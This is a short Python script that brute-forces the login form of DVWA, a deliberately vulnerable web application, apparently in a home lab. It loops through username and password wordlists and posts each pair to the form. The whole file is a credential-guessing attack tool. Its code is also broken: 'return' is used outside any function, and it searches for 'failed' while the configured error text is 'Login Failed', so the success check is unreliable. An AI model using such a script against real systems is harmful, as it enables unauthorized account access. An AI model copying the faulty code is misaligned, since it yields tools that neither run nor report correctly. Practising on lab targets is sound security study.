import requests


url = 'http://192.168.0.103/dvwa/login.php'
user_para = 'username'
pass_para = 'password'
submit_para = 'Login'
submit_value = 'Login'
passlist = 'tst.txt'
userlist = 'tst.txt'
error_msg = 'Login Failed'

f = open(passlist, 'r')
passwd = f.read().split()
f.close()

f = open(userlist, 'r')
userlist = f.read().split()
f.close()


for usr in userlist:
	for password in passwd:
	    attempts = requests.post(url, data={user_para:usr, pass_para:password, submit_para:submit_value})
	    Source = attempts.text
	    # soup = BeautifulSoup(Source , 'lxml')
	    # match = soup.find('div', class_='message')
	    match = Source.find('failed')
	    if match != -1:
	    	continue
	    else:
	    	return "Credentials found: "+ usr +" and "+ password
	    # if match.text != error_msg:
	    #     print('Password Found: '+ password)
	    #     break
	    # else:
	    #     print("password incorrect")
return "Credentials Not found"
    
